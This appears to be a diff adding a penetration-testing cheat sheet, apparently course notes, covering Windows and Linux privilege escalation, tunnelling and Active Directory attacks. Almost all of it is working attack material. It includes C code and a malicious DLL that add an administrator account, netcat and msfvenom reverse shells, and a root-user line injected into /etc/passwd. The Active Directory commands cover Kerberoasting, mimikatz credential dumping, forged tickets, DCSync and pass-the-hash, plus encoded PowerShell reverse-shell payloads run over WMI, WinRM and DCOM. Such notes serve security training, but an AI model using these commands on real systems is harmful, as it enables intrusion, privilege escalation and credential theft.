+<p><code>PS C:\&gt; Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like &#39;Running&#39;}</code>
+<code>C:\&gt; icacls &quot;C:\xampp\apache\bin\httpd.exe&quot;</code></p>
+
+<div><pre><code class="language-none">#include &lt;stdlib.h&gt;
+
+int main ()
+{
+  int i;
+
+  i = system (&quot;net user dave2 password123! /add&quot;);
+  i = system (&quot;net localgroup administrators dave2 /add&quot;);
+
+  return 0;
+}</code></pre></div>
+
+<p><code>kali@kali:~$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe</code>
+<code>C:\&gt; sc.exe stop mysql</code>
+<code>C:\&gt; net stop mysql</code>
+<code>PS C:\&gt; Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like &#39;mysql&#39;}</code>
+<code>PS C:\&gt; whoami /priv</code>
+<code>PS C:\&gt; . .\PowerUp.ps1</code>
+<code>PS C:\&gt; Get-ModifiableServiceFile</code></p>
+
+<p><!-- TOC --><a name="service-dll-hijacking"></a></p>
+
+<h2 id="toc_26">Service DLL Hijacking</h2>
+
+<p><code>PS C:\&gt; Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like &#39;Running&#39;}</code>
+<code>C:\&gt; icacls .\Documents\BetaServ.exe</code>
+<code>PS C:\&gt; Restart-Service BetaService</code>
+<code>PS C:\&gt; $env:path</code></p>
+
+<div><pre><code class="language-none">#include &lt;stdlib.h&gt;
+#include &lt;windows.h&gt;
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+        i = system (&quot;net user dave2 password123! /add&quot;);
+        i = system (&quot;net localgroup administrators dave2 /add&quot;);
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}</code></pre></div>
+
+<p><code>kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll</code></p>
+
+<p><!-- TOC --><a name="unquoted-service-paths"></a></p>
+
+<h2 id="toc_27">Unquoted Service Paths</h2>
+
+<p><code>PS C:\&gt; Get-CimInstance -ClassName win32_service | Select Name,State,PathName</code>
+<code>PS C:\&gt; wmic service get name,pathname |  findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code>
+<code>PS C:\&gt; . .\PowerUp.ps1</code>
+<code>PS C:\&gt; Get-UnquotedService</code></p>
+
+<p><!-- TOC --><a name="scheduled-tasks"></a></p>
+
+<h2 id="toc_28">Scheduled Tasks</h2>
+
+<p><code>C:\&gt; schtasks /query /fo LIST /v</code></p>
+
+<p><!-- TOC --><a name="using-exploits"></a></p>
+
+<h2 id="toc_29">Using exploits</h2>
+
+<p><code>C:\&gt; whoami /priv</code></p>
+
+<div><pre><code class="language-none">PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled</code></pre></div>
+
+<p><code>PS C:\&gt; .\PrintSpoofer64.exe -i -c powershell.exe</code>
+<code>PS C:\&gt; PrintSpoofer.exe -c &quot;c:\tools\nc.exe 10.10.10.10 443 -e cmd&quot;</code></p>
+
+<blockquote>
+<p>RottenPotato, SweetPotato or JuicyPotato</p>
+
+<p>if you see PrintSpoofer failing you need to check if the spooler service is running</p>
+</blockquote>
+
+<p><code>PS C:\&gt; Get-Service -Name Spooler</code></p>
+
+<blockquote>
+<p>Robocopy Backup mode is a way to read and write files ignoring any permissions problems. It uses the SeBackupPrivilege</p>
+</blockquote>
+
+<p><!-- TOC --><a name="linux-privilege-escalation"></a></p>
+
+<h1 id="toc_30">Linux Privilege Escalation</h1>
+
+<p><!-- TOC --><a name="manual-enumeration"></a></p>
+
+<h2 id="toc_31">Manual Enumeration</h2>
+
+<p><code>$ id</code></p>
+
+<p><code>$ whoami</code></p>
+
+<p><code>$ sudo -l</code></p>
+
+<p><code>$ sudo -i</code></p>
+
+<p><code>$ env</code></p>
+
+<p><code>$ cat .bashrc</code></p>
+
+<p><code>$ cat /etc/passwd</code></p>
+
+<p><code>$ hostname</code></p>
+
+<p><code>$ cat /etc/issue&#39;</code></p>
+
+<p><code>$ cat /etc/os-release</code></p>
+
+<p><code>$ uname -a</code></p>
+
+<p><code>$ ps aux</code></p>
+
+<p><code>$ ip a</code></p>
+
+<p><code>$ routel</code></p>
+
+<p><code>$ ss -ntlpu</code></p>
+
+<p><code>$ cat /etc/iptables/rules.v4</code></p>
+
+<p><code>ls -lah /etc/cron*</code></p>
+
+<p><code>crontab -l</code></p>
+
+<p><code>dpkg -l</code></p>
+
+<p><code>find / -writable -type d 2&gt;/dev/null</code></p>
+
+<p><code>cat /etc/fstab</code></p>
+
+<p><code>$ lsblk</code></p>
+
+<p><code>$ find / -perm -u=s -type f 2&gt;/dev/null</code></p>
+
+<p><code>$ dpkg --list | grep compiler</code></p>
+
+<p><code>$ watch -n 1 &quot;ps -aux | grep pass&quot;</code></p>
+
+<p><code>$ sudo tcpdump -i lo -A | grep &quot;pass&quot;</code></p>
+
+<p><code>$ find . -type f -name &quot;*.kdbx&quot;</code></p>
+
+<p><code>$ grep -Rni . -e &#39;password&#39; // search for interesting string recursively in files.</code></p>
+
+<p><code>$ ./pspy</code> </p>
+
+<blockquote>
+<p>Try this when I do not have permission to list running proceses.</p>
+</blockquote>
+
+<p><!-- TOC --><a name="automated-enumeration-1"></a></p>
+
+<h2 id="toc_32">Automated Enumeration</h2>
+
+<p><code>$ chmod a+x ./linpeas.sh</code></p>
+
+<p><code>$ ./unix-privesc-check standard &gt; output.txt</code></p>
+
+<blockquote>
+<p>linPeas, linEnum</p>
+</blockquote>
+
+<p><!-- TOC --><a name="insecure-file-permissions"></a></p>
+
+<h2 id="toc_33">Insecure File Permissions</h2>
+
+<p><code>$ grep &quot;CRON&quot; /var/log/syslog</code></p>
+
+<p><!-- TOC --><a name="abusing-password-authentication"></a></p>
+
+<h2 id="toc_34">Abusing Password Authentication</h2>
+
+<p><code>$ openssl passwd w00t</code></p>
+
+<p><code>$ echo &quot;root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</code>
+<code>$ su root2</code></p>
+
+<p><!-- TOC --><a name="easy-root-shell"></a></p>
+
+<h2 id="toc_35">Easy root shell</h2>
+
+<p><code>$ chmod u+s /bin/bash</code></p>
+
+<p><code>$ /bin/bash -p</code></p>
+
+<p><!-- TOC --><a name="abusing-setuid-binaries-and-capabilities"></a></p>
+
+<h2 id="toc_36">Abusing Setuid Binaries and Capabilities</h2>
+
+<p><code>$ /usr/sbin/getcap -r / 2&gt;/dev/null</code></p>
+
+<blockquote>
+<p>https://gtfobins.github.io</p>
+</blockquote>
+
+<p><!-- TOC --><a name="abusing-sudo"></a></p>
+
+<h2 id="toc_37">Abusing sudo</h2>
+
+<p><code>$ sudo -l</code></p>
+
+<p><!-- TOC --><a name="exploiting-kernel-vulnerabilities"></a></p>
+
+<h2 id="toc_38">Exploiting Kernel Vulnerabilities</h2>
+
+<p><code>$ cat /etc/issue</code></p>
+
+<p><code>$ uname -r</code></p>
+
+<p><code>$ arch</code></p>
+
+<p><!-- TOC --><a name="port-redirection-and-ssh-tunneling"></a></p>
+
+<h1 id="toc_39">Port Redirection and SSH Tunneling</h1>
+
+<p><!-- TOC --><a name="port-forwward-with-socat"></a></p>
+
+<h2 id="toc_40">Port Forwward with socat</h2>
+
+<blockquote>
+<p>from owned machine</p>
+</blockquote>
+
+<p><code>$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22</code></p>
+
+<blockquote>
+<p>to target machine</p>
+
+<p>from my Kali</p>
+</blockquote>
+
+<p><code>kali@kali:~$ database_admin@192.168.50.63 -p2222</code></p>
+
+<p><!-- TOC --><a name="ssh-local-port-forwarding"></a></p>
+
+<h2 id="toc_41">SSH Local Port Forwarding</h2>
+
+<p><code>$ ssh -N -L 0.0.0.0:4455:172.16.50.217:445 database_admin@10.4.50.215</code> </p>
+
+<blockquote>
+<p>from owned machine to smb target</p>
+</blockquote>
+
+<p><code>kali@kali:~$ smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234</code></p>
+
+<p><!-- TOC --><a name="ssh-dynamic-port-forwarding"></a></p>
+
+<h2 id="toc_42">SSH Dynamic Port Forwarding</h2>
+
+<p><code>$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215</code> </p>
+
+<blockquote>
+<p>on owned machine to target</p>
+</blockquote>
+
+<p><code>$ tail /etc/proxychains4.conf</code></p>
+
+<p><code>$ socks5 Owned_machine_IP 9999</code></p>
+
+<p><code>$ proxychains smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234</code> </p>
+
+<blockquote>
+<p>to target machine</p>
+</blockquote>
+
+<p><!-- TOC --><a name="ssh-remote-port-forwarding"></a></p>
+
+<h2 id="toc_43">SSH Remote Port Forwarding</h2>
+
+<p><code>kali@kali:~$ sudo systemctl start ssh</code></p>
+
+<p><code>$ ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@IP_Kali</code></p>
+
+<blockquote>
+<p>On owned machine, from local to target through Kali.</p>
+</blockquote>
+
+<p><code>kali@kali:~$ psql -h 127.0.0.1 -p 2345 -U postgres</code></p>
+
+<p><code>kali@kali:~$ ssh -R 4444:localhost:4444 web_svc@192.168.244.147</code></p>
+
+<blockquote>
+<p>Redirect 4444 inconming traffic from MS01 to Kali</p>
+</blockquote>
+
+<p><code>$ ssh -R *:60002:127.0.0.1:60002 kali@IP_Kali</code></p>
+
+<blockquote>
+<p>on owned machine, redirect to local port. Can open http://127.0.0.1:60002/ from Kali</p>
+</blockquote>
+
+<p><!-- TOC --><a name="ssh-remote-dynamic-port-forwarding"></a></p>
+
+<h2 id="toc_44">SSH Remote Dynamic Port Forwarding</h2>
+
+<p><code>$ ssh -N -R 9998 kali@IP_Kali</code></p>
+
+<blockquote>
+<p>From owned machine</p>
+</blockquote>
+
+<div><pre><code class="language-none">kali@kali:~$ tail /etc/proxychains4.conf
+socks5 127.0.0.1 9998</code></pre></div>
+
+<p><code>kali@kali:~$ proxychains nmap -vvv -sT --top-ports=20 -Pn -n 10.4.50.64</code> </p>
+
+<blockquote>
+<p>to target</p>
+</blockquote>
+
+<p><!-- TOC --><a name="using-sshuttle"></a></p>
+
+<h2 id="toc_45">Using sshuttle</h2>
+
+<p><code>$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22</code></p>
+
+<blockquote>
+<p>On owned machine</p>
+</blockquote>
+
+<p><code>kali@kali:~$ sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24</code></p>
+
+<p><code>kali@kali:~$ smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234</code></p>
+
+<p><!-- TOC --><a name="port-forwarding-with-windows-tools"></a></p>
+
+<h2 id="toc_46">Port Forwarding with Windows Tools</h2>
+
+<p><!-- TOC --><a name="sshexe"></a></p>
+
+<h3 id="toc_47">ssh.exe</h3>
+
+<p><code>kali@kali:~$ sudo systemctl start ssh</code></p>
+
+<p><code>C:\&gt; ssh.exe -V</code></p>
+
+<blockquote>
+<p>On owned machine. OpenSSH version must be &gt; 7.6</p>
+</blockquote>
+
+<p><code>C:\&gt; ssh -N -R 1080 kali@192.168.49.100</code>
+<code>kali@kali:~$ proxychains psql -h 10.4.50.215 -U postgres</code></p>
+
+<blockquote>
+<p>to remote target</p>
+</blockquote>
+
+<p><!-- TOC --><a name="plink"></a></p>
+
+<h3 id="toc_48">Plink</h3>
+
+<p><code>C:\Windows\Temp\plink.exe -ssh -l kali -pw kali -R 127.0.0.1:3306:127.0.0.1:3306 192.168.49.100</code> </p>
+
+<blockquote>
+<p>From owned local 9833 to local 3389</p>
+</blockquote>
+
+<p><code>kali@kali:~$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833</code></p>
+
+<p><!-- TOC --><a name="netsh"></a></p>
+
+<h3 id="toc_49">Netsh</h3>
+
+<p><code>C:\&gt; netsh interface portproxy add v4tov4 listenport=2222 listenaddress=192.168.50.64 connectport=22 connectaddress=10.4.50.215</code></p>
+
+<p><code>kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222</code></p>
+
+<p><code>C:\&gt; netsh advfirewall firewall add rule
+name=&quot;port_forward_ssh_2222&quot; protocol=TCP dir=in localip=192.168.50.64 localport=2222 action=allow</code></p>
+
+<p><code>kali@kali:~$ sudo nmap -sS 192.168.50.64 -Pn -n -p2222</code></p>
+
+<p><code>kali@kali:~$ ssh database_admin@192.168.50.64 -p2222</code></p>
+
+<p><code>C:\&gt; netsh advfirewall firewall delete rule name=&quot;port_forward_ssh_2222&quot;
+netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64</code></p>
+
+<p><!-- TOC --><a name="tunneling-through-deep-packet-inspection"></a></p>
+
+<h1 id="toc_50">Tunneling Through Deep Packet Inspection</h1>
+
+<p><!-- TOC --><a name="http-tunneling-with-chisel"></a></p>
+
+<h2 id="toc_51">HTTP Tunneling with Chisel</h2>
+
+<p><code>kali@kali:~$ chisel server --port 8080 --reverse
+./chisel client IP_Kali:8080 R:socks</code> </p>
+
+<blockquote>
+<p>On owned machine</p>
+</blockquote>
+
+<p><code>proxychains curl http://127.0.0.1:8000/</code></p>
+
+<blockquote>
+<p>Works!</p>
+</blockquote>
+
+<p><code>proxychains firefox http://127.0.0.1:8000/</code></p>
+
+<blockquote>
+<p>Does not work.</p>
+</blockquote>
+
+<p><code>./chisel client IP_Kali:8080 R:8000:127.0.0.1:8000</code> </p>
+
+<blockquote>
+<p>Navigating to http://127.0.0.1:8000/ works!</p>
+</blockquote>
+
+<p><!-- TOC --><a name="dns-tunneling-with-dnscat2"></a></p>
+
+<h2 id="toc_52">DNS Tunneling with dnscat2</h2>
+
+<p><code>kali@felineauthority:~$ dnscat2-server feline.corp
+dnscat2&gt; windows</code></p>
+
+<p><code>dnscat2&gt; window -i 1</code></p>
+
+<p><code>database_admin@pgdatabase01:~/dnscat$ ./dnscat feline.corp</code></p>
+
+<p><code>command (pgdatabase01) 1&gt; listen 127.0.0.1:4455 172.16.2.11:445</code></p>
+
+<p><code>kali@felineauthority:~$ smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234</code></p>
+
+<p><!-- TOC --><a name="ligolo"></a></p>
+
+<h2 id="toc_53">Ligolo</h2>
+
+<p><a href="https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5">https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5</a>
+<a href="https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740">https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740</a></p>
+
+<blockquote>
+<p>To remove tun interface</p>
+</blockquote>
+
+<p><code>$ sudo ip link del ligolo</code></p>
+
+<p><!-- TOC --><a name="metasploit"></a></p>
+
+<h1 id="toc_54">Metasploit</h1>
+
+<p><code>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4445 -f exe -o nonstaged.exe</code></p>
+
+<p><code>$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=4445 -f elf -o reverse.elf</code></p>
+
+<p><code>$ msfconsole -q -x &#39;use multi/handler;set payload  windows/x64/shell_reverse_tcp;set lhost 192.168.45.187; set lport 4445;run&#39;</code></p>
+
+<p><!-- TOC --><a name="active-directory-introduction-and-enumeration"></a></p>
+
+<h1 id="toc_55">Active Directory Introduction and Enumeration</h1>
+
+<p><!-- TOC --><a name="manual-enumeration-expanding-our-repertoire"></a></p>
+
+<h2 id="toc_56">Manual Enumeration - Expanding our Repertoire</h2>
+
+<p><code>C:\&gt; net user /domain</code>
+<code>C:\&gt; net user jeffadmin /domain</code>
+<code>C:\&gt; net group /domain</code>
+<code>C:\&gt; net group &quot;Sales Department&quot; /domain</code></p>
+
+<p><code>PS C:\&gt; Import-Module .\PowerView.ps1</code>
+<code>PS C:\&gt; Get-NetDomain</code>
+<code>PS C:\&gt; Get-NetUser</code>
+<code>PS C:\&gt; Get-NetUser | select cn</code>
+<code>PS C:\&gt; Get-NetUser | select cn,pwdlastset,lastlogon</code>
+<code>PS C:\&gt; Get-NetGroup &quot;Sales Department&quot; | select member</code>
+<code>PS C:\&gt; Get-NetComputer</code>
+<code>PS C:\&gt; Get-NetComputer | select operatingsystem,dnshostname</code>
+<code>PS C:\&gt; Find-LocalAdminAccess</code>
+<code>PS C:\&gt; Get-NetSession -ComputerName files04 -Verbose</code>
+<code>PS C:\&gt; Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl</code>
+<code>PS C:\&gt; Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion</code></p>
+
+<p><code>PS C:\&gt; .\PsLoggedon.exe \\files04</code></p>
+
+<blockquote>
+<p>Check logged on users on machine through remote registry (if enabled)</p>
+</blockquote>
+
+<p><code>C:\&gt; setspn -L iis_service</code>
+<code>PS C:\&gt; Get-NetUser -SPN | select samaccountname,serviceprincipalname</code>
+<code>PS C:\&gt; Get-ObjectAcl -Identity stephanie
+Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104</code>
+<code>PS C:\&gt; Get-ObjectAcl -Identity &quot;Management Department&quot; | ? {$_.ActiveDirectoryRights -eq &quot;GenericAll&quot;} | select SecurityIdentifier,ActiveDirectoryRights
+&quot;S-1-5-21-1987370270-658905905-1781884369-512&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-1104&quot;,&quot;S-1-5-32-548&quot;,&quot;S-1-5-18&quot;,&quot;S-1-5-21-1987370270-658905905-1781884369-519&quot; | Convert-SidToName</code></p>
+
+<p><code>C:\&gt; net group &quot;Management Department&quot; stephanie /add /domain</code>
+<code>PS C:\&gt; Get-NetGroup &quot;Management Department&quot; | select member</code>
+<code>PS C:\&gt; Find-DomainShare</code>
+<code>kali@kali:~$ gpp-decrypt &quot;+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE&quot;</code></p>
+
+<p><!-- TOC --><a name="active-directory-automated-enumeration"></a></p>
+
+<h2 id="toc_57">Active Directory - Automated Enumeration</h2>
+
+<p><code>PS C:\&gt; Import-Module .\Sharphound.ps1</code>
+<code>PS C:\&gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\Administrator\Documents\ -OutputPrefix &quot;oscp audit&quot;</code></p>
+
+<p><code>kali@kali:~$ sudo neo4j start</code></p>
+
+<p><code>kali@kali:~$ bloodhound</code></p>
+
+<blockquote>
+<p>Some useful queries</p>
+</blockquote>
+
+<p><code>MATCH (m:Computer) RETURN m</code>
+<code>MATCH p = (c:Computer)-[:HasSession]-&gt;(m:User) RETURN p</code></p>
+
+<p><!-- TOC --><a name="attacking-active-directory-authentication"></a></p>
+
+<h1 id="toc_58">Attacking Active Directory Authentication</h1>
+
+<p><!-- TOC --><a name="password-attacks-1"></a></p>
+
+<h2 id="toc_59">Password Attacks</h2>
+
+<p><code>PS C:\&gt; .\Spray-Passwords.ps1 -Pass Nexus123! -Admin</code></p>
+
+<p><!-- TOC --><a name="as-rep-roasting"></a></p>
+
+<h2 id="toc_60">AS-REP Roasting</h2>
+
+<p><code>kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete</code></p>
+
+<p><code>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code></p>
+
+<p><code>PS C:\Tools&gt; .\Rubeus.exe asreproast /nowrap</code></p>
+
+<p><!-- TOC --><a name="kerberoasting"></a></p>
+
+<h2 id="toc_61">Kerberoasting</h2>
+
+<p><code>PS C:\Tools&gt; .\Rubeus.exe kerberoast /outfile:hashes.kerberoast</code>
+<code>kali@kali:~$ sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</code>
+<code>kali@kali:~$ sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete</code></p>
+
+<p><!-- TOC --><a name="silver-tickets"></a></p>
+
+<h2 id="toc_62">Silver Tickets</h2>
+
+<p><code>PS C:\Users\jeff&gt; iwr -UseDefaultCredentials http://web04</code></p>
+
+<div><pre><code class="language-none">mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+* NTLM     : 4d28cf5252d39971419580a51484ca09</code></pre></div>
+
+<p><code>PS C:\Users\jeff&gt; whoami /user</code></p>
+
+<div><pre><code class="language-none">User Name SID
+========= =============================================
+corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105</code></pre></div>
+
+<p>.</p>
+
+<div><pre><code class="language-none">mimikatz # kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+mimikatz # exit</code></pre></div>
+
+<p><code>PS C:\Tools&gt; klist</code>
+<code>PS C:\Tools&gt; iwr -UseDefaultCredentials http://web04</code></p>
+
+<p><!-- TOC --><a name="domain-controller-synchronization"></a></p>
+
+<h2 id="toc_63">Domain Controller Synchronization</h2>
+
+<blockquote>
+<p>a user needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. By 
+default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights assigned.</p>
+</blockquote>
+
+<p><code>PS C:\Tools&gt; .\mimikatz.exe</code>
+...</p>
+
+<p><code>mimikatz # lsadump::dcsync /user:corp\dave</code></p>
+
+<p><code>kali@kali:~$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:&quot;BrouhahaTungPerorateBroom2023\!&quot;@192.168.50.70</code></p>
+
+<p><!-- TOC --><a name="lateral-movement-in-active-directory"></a></p>
+
+<h1 id="toc_64">Lateral Movement in Active Directory</h1>
+
+<p><!-- TOC --><a name="wmi-and-winrm"></a></p>
+
+<h2 id="toc_65">WMI and WinRM</h2>
+
+<blockquote>
+<p>To create a process on the remote target via WMI, we need the credentials of a member of the Administrators local group, which can also be a domain user.</p>
+</blockquote>
+
+<p><code>C:\&gt; wmic /node:192.168.50.73 /user:jen /password:Nexus123! process call create &quot;calc&quot;</code></p>
+
+<div><pre><code class="language-none">$username = &#39;jen&#39;;
+$password = &#39;Nexus123!&#39;;
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+$Options = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName 192.168.100.100 -Credential $credential -SessionOption $Options
+$Command = &#39;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#39;;
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};</code></pre></div>
+
+<p><code>C:\&gt; winrs -r:files04 -u:jen -p:Nexus123!  &quot;cmd /c hostname &amp; whoami&quot;</code>
+<code>C:\&gt; winrs -r:files04 -u:jen -p:Nexus123!  &quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
+HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;</code></p>
+
+<blockquote>
+<p>winrm through Powershell</p>
+</blockquote>
+
+<div><pre><code class="language-none">$username = &#39;jen&#39;;
+$password = &#39;Nexus123!&#39;;
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName 192.168.50.73 -Credential $credential
+Enter-PSSession 1
+whoami
+hostname</code></pre></div>
+
+<p><code>C:\Users\jeff&gt;winrs -r:files04 -u:jen -p:Nexus123! &quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAF MAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD... HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;</code></p>
+
+<p><!-- TOC --><a name="psexec"></a></p>
+
+<h2 id="toc_66">PsExec</h2>
+
+<blockquote>
+<p>Three requisites must be met. First, the user that authenticates to the target machine needs to be part of the Administrators local group. Second, the ADMIN$ share must be available, and third, File and Printer Sharing has to be turned on</p>
+</blockquote>
+
+<p><code>PS C:\&gt; ./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd</code></p>
+
+<p><!-- TOC --><a name="pass-the-hash"></a></p>
+
+<h2 id="toc_67">Pass the Hash</h2>
+
+<blockquote>
+<p>First, it requires an SMB connection through the firewall (commonly port 445), and second, the Windows File and Printer Sharing feature to be enabled. These requirements are common in internal enterprise environments.</p>
+</blockquote>
+
+<p><code>kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73</code></p>
+
+<p><!-- TOC --><a name="overpass-the-hash"></a></p>
+
+<h2 id="toc_68">Overpass the Hash</h2>
+
+<div><pre><code class="language-none">mimikatz #privilege::debug
+mimikatz #sekurlsa::logonpasswords
+mimikatz #sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell</code></pre></div>
+
+<p><code>PS C:\Windows\system32&gt; klist</code>
+<code>C:\&gt; net use \\files04</code>
+<code>C:\&gt; klist</code>
+<code>PS C:\&gt; .\PsExec.exe \\files04 cmd</code></p>
+
+<p><!-- TOC --><a name="pass-the-ticket"></a></p>
+
+<h2 id="toc_69">Pass the Ticket</h2>
+
+<p><code>PS C:\Windows\system32&gt; whoami</code></p>
+
+<div><pre><code class="language-none">corp\jen</code></pre></div>
+
+<p><code>PS C:\Windows\system32&gt; ls \\web04\backup</code></p>
+
+<div><pre><code class="language-none">ls : Access to the path &#39;\\web04\backup&#39; is denied.
+
+mimikatz #privilege::debug
+mimikatz #sekurlsa::tickets /export</code></pre></div>
+
+<p><code>PS C:\Tools&gt; dir *.kirbi</code></p>
+
+<div><pre><code class="language-none">mimikatz #kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
+mimikatz # kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi</code></pre></div>
+
+<p><code>PS C:\Tools&gt; klist</code></p>
+
+<p><code>PS C:\Tools&gt; ls \\web04\backup</code></p>
+
+<p><!-- TOC --><a name="dcom"></a></p>
+
+<h2 id="toc_70">DCOM</h2>
+
+<blockquote>
+<p>this method allows the execution of any shell command as long as the authenticated user is authorize</p>
+
+<div><pre><code class="language-none">$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application.1&quot;,&quot;192.168.50.73&quot;))
+$dcom.Document.ActiveView.ExecuteShellCommand(&quot;cmd&quot;,$null,&quot;/c calc&quot;,&quot;7&quot;)
+$dcom.Document.ActiveView.ExecuteShellCommand(&quot;powershell&quot;,$null,&quot;powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
+AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&quot;,&quot;7&quot;)</code></pre></div>
+</blockquote>
+
+<p><!-- TOC --><a name="golden-ticket"></a></p>
+
+<h2 id="toc_71">Golden Ticket</h2>
+
+<p><code>C:\Tools\SysinternalsSuite&gt;PsExec64.exe \\DC1 cmd.exe</code></p>
+
+<div><pre><code class="language-none">PsExec v2.4 - Execute processes remotely
+Copyright (C) 2001-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+Couldn&#39;t access DC1:
+Access is denied.
+
+mimikatz # privilege::debug
+mimikatz # lsadump::lsa /patch
+Domain : CORP / S-1-5-21-1987370270-658905905-1781884369
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : 2892d26cdf84d7a70e2eb3b9f05c425e
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 1693c6cefafffc7af11ef34d1c788f47</code></pre></div>
+
+<p>.</p>
+
+<div><pre><code class="language-none">mimikatz # kerberos::purge
